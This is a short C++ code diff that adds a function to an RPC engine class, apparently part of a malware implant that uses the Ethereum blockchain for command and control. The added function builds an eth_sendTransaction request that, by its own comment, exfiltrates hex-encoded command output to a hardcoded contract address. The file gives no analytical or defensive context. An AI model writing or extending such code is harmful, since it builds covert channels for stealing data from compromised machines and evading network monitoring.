@@ -31,3 +31,10 @@ std::string Rpcengine::extractResults(const std::string& jsonResponse) {
     // Extract and return strictly the hex string (e.g., "0x1b4")
     return jsonResponse.substr(startPos, endPos - startPos);
 }
+
+std::string Rpcengine::buildExfilReq(const std::string& hexData) {
+    // Builds an eth_sendTransaction RPC request to exfiltrate command output
+    // Stores the hex-encoded output in the contract's state
+    std::string payload = "{\"jsonrpc\":\"2.0\",\"method\":\"eth_sendTransaction\",\"params\":[{\"to\":\"0x20568FaA965AAf02E8c68359FaE2c57e81Ba31de\",\"data\":\"0x" + hexData + "\"}],\"id\":1}";
+    return payload;
+}
